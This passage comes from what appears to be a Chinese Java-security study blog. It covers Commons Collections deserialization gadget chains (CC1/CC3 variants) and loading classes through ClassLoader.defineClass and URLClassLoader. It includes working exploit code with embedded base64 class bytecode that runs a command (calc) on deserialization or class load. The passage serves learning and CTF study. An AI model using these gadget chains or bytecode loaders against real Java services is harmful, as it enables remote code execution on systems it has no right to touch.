<span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">            setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">            <span class="comment">// ==================</span></span><br><span class="line">            <span class="comment">// 生成序列化字符串</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 本地测试触发</span></span><br><span class="line">            <span class="comment">// System.out.println(barr);</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>bfengj大佬对CC3链在版本中使用的改造，使用CC6同种逻辑</p></blockquote> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_bfengj_improved</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] code =  Base64.decode(<span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;feng&quot;</span>);</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] trueTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;feng1&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;feng2&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;feng1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer,trueTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(expMap);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java安全漫谈</li><li>还是信工所大佬</li><li><a href="https://github.com/phith0n/JavaThings/tree/master/general/src/main/java/com/govuln/deserialization">p牛的poc</a></li><li><a href="https://www.anquanke.com/post/id/261724">还挺不错的文章</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全3(2)_常用加载方法</title>
      <link href="/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/"/>
      <url>/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><h3 id="ClassLoader快速复习"><a href="#ClassLoader快速复习" class="headerlink" title="ClassLoader快速复习"></a>ClassLoader快速复习</h3><ol><li>类加载器 ClassLoader 是实现类加载机制的一个重要组成部分，负责将类文件加载到内存中并转换为可执行的 Java 类。<code>java.lang.ClassLoader</code>是所有类加载器的父类，在其中有三个关键方法：<ol><li><code>loadClass(String name, boolean resolve)</code>：该方法用于加载类，并根据 resolve 参数决定是否解析该类，如果 resolve 为 true，则在加载类的同时，也会解析该类的依赖项。</li><li><code>findClass(String name)</code>：该方法用于查找并加载指定名称的类。</li><li><code>defineClass(String name, byte[] b, int off, int len)</code>：该方法将一个字节数组表示的类定义转换为一个 Class 对象，用于将类的字节码转换为 Class 对象。</li></ol></li><li>操作本地类的字节码(本地文件中的java字节码放置.class文件中)<ol><li><p><strong>编译成字节码</strong>：<code>javac HelloWorld.java</code>，使用当前配置的java版本进行编译，不同java版本可能不能公用字节码</p><blockquote><p>报错关键字: major version<br>每个Java版本都有其特定的类文件格式版本号（major.minor version）。例如：<br>Java 7: 51.0<br>Java 8: 52.0<br>Java 9: 53.0<br>Java 10: 54.0</p></blockquote></li><li><p><strong>反汇编class文件以查看字节码</strong>：<code>javap -c -p -l HelloWorld.class</code></p></li><li><p><strong>查看class文件二进制内容</strong>：可以使用<code>xxd HelloWorld.class</code>来查看</p></li></ol></li></ol><h3 id="defineClass加载恶意类"><a href="#defineClass加载恶意类" class="headerlink" title="defineClass加载恶意类"></a>defineClass加载恶意类</h3><blockquote><ol><li>注意到: Class.forName(“类名”)默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用Class.forName(“类名”, 是否初始化类, 类加载器)，而ClassLoader.loadClass默认不会初始化类方法 –&gt; 即使是static{}里的代码也不会执行</li><li>使用base64编码获取.class的字节码<code>cat TestClass.class | base64</code>并结合Byte[]数组可以直接加载类</li></ol></blockquote><ol><li>这里的恶意类ClassLoaderPayload不要带 package 包名</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ClassLoaderPayload.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassLoaderPayload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoaderRCE.java</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">defineMehtod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            defineMehtod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// javac ClassLoaderPayload.java &amp;&amp; cat ClassLoaderPayload.class | base64</span></span><br><span class="line">            <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClW&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHABkHABcBAApTb3VyY2VG&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;aWxlAQAXQ2xhc3NMb2FkZXJQYXlsb2FkLmphdmEMAAkACgcAGwwAHAAdAQAEY2FsYwwAHgAfAQAT&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;amF2YS9sYW5nL0V4Y2VwdGlvbgwAIAAKAQASQ2xhc3NMb2FkZXJQYXlsb2FkAQAQamF2YS9sYW5n&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;L09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9S&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;dW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsB&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;AA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAEAAQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgA&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;AhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAMAAAAGgAGAAAAAgAEAAQADQAHABAABQARAAYA&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;FQAIAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAAAAACABE=&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> (Class) defineMehtod.invoke(ClassLoader.getSystemClassLoader(), code , <span class="number">0</span>, code.length);</span><br><span class="line">            p.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><h3 id="什么是URLClassLoader"><a href="#什么是URLClassLoader" class="headerlink" title="什么是URLClassLoader"></a>什么是URLClassLoader</h3><ol><li><p>看看源码和大佬的博客</p><ol><li>翻译1：对应的URL有&#x2F;的就当作目录，没有&#x2F;的就当作jar文件处理</li><li>翻译2：创建 URLClassLoader 实例的线程的 AccessControlContext 将在随后加载类和资源时使用</li><li>翻译3：默认情况下，加载的类仅被授予访问创建 URLClassLoader 时指定的 URL 的权限</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This class loader is used to load classes and resources from a search</span></span><br><span class="line"><span class="comment"> * path of URLs referring to both JAR files and directories. Any URL that</span></span><br><span class="line"><span class="comment"> * ends with a &#x27;/&#x27; is assumed to refer to a directory. Otherwise, the URL</span></span><br><span class="line"><span class="comment"> * is assumed to refer to a JAR file which will be opened as needed.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The AccessControlContext of the thread that created the instance of</span></span><br><span class="line"><span class="comment"> * URLClassLoader will be used when subsequently loading classes and</span></span><br><span class="line"><span class="comment"> * resources.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The classes that are loaded are by default granted permission only to</span></span><br><span class="line"><span class="comment"> * access the URLs specified when the URLClassLoader was created.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  David Connelly</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoader</span> <span class="keyword">extends</span> <span class="title class_">SecureClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>URLClassLoader 实际上是我们<strong>平时默认使用的 AppClassLoader 的父类</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Launcher</span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">AppClassLoader</span> <span class="keyword">extends</span> <span class="title class_">URLClassLoader</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是<strong>经过处理后的java.net.URL类</strong>）来寻找.class文件来加载</li><li>基础路径有分为三种情况<ol><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻</li><li>找.class文件URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 –&gt; 比如<code>http</code>等远程协议时，涉及到一个问题**Java的URL究竟支持哪些协议?**，后面再来</li></ol></li></ol></li><li><p><em><strong>工作原理</strong></em>: 对远程功能的添加在于重写<code>@Override: findClass()</code>这个方法</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 关于构造函数，这里主要是看到ucp就是我们传入的url的处理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">URLClassLoader(URL[] urls, AccessControlContext acc) &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="literal">null</span>) &#123;</span><br><span class="line">        security.checkCreateClassLoader();</span><br><span class="line">    &#125;</span><br><span class="line">    ucp = <span class="keyword">new</span> <span class="title class_">URLClassPath</span>(urls);</span><br><span class="line">    <span class="built_in">this</span>.acc = acc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 我的说明：逻辑就不细讲了，但是可以看到在findClass()中处理的ucp就是从外部传入的那个路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(<span class="keyword">final</span> String name)</span><br><span class="line">     <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> 